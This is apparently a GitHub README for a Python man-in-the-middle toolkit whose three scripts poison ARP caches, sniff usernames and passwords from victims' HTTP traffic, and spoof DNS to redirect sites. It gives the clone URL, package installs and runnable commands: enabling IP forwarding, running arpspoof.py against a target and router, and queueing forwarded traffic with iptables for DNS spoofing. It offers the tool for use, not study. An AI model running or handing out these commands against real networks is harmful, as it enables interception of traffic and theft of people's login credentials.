# MITM-Attacks
Man In the Middle Attack Using Python 

This is a simple tool for poisoning the arp protocol by spoofing router.

It Contains two scripts :
      
      1. Arp Poisoning Script - Spoofs the IP Address and Mac Address.
      2. Sniffer Script - It Captures passwords and username (Only if victim uses http websites).
      3. Dns Spoofer - It redirects Spoofed Site.


**Requirements :**

Python 3.x

Pip packages - scapy,time,netfilterqueue

pip install scapy

pip install netfilterqueue

**Installation :**

git clone https://github.com/Mohammedthoufeeq/MITM-Attacks/


**Usage :**

cd MITM-Attacks

"$sudo echo 1 > /proc/sys/net/ipv4/ip_forward" - To Forwarding (Before arpspoof.py )


To spoof,
  python arpspoof.py -t target_ip -r router_ip

To sniff,
  python sniifer.py 

To dns spoofing,
  
  "$iptables -I FORWARD -j NFQUEUE --queue-num 0" - To queue the responses

  python dns_spoof.py
  
  After exiting, use "$iptables --flush" to default iptable rule

**Note : Sniffer only works if "arpspoof.py" is running on background in another terminal.**




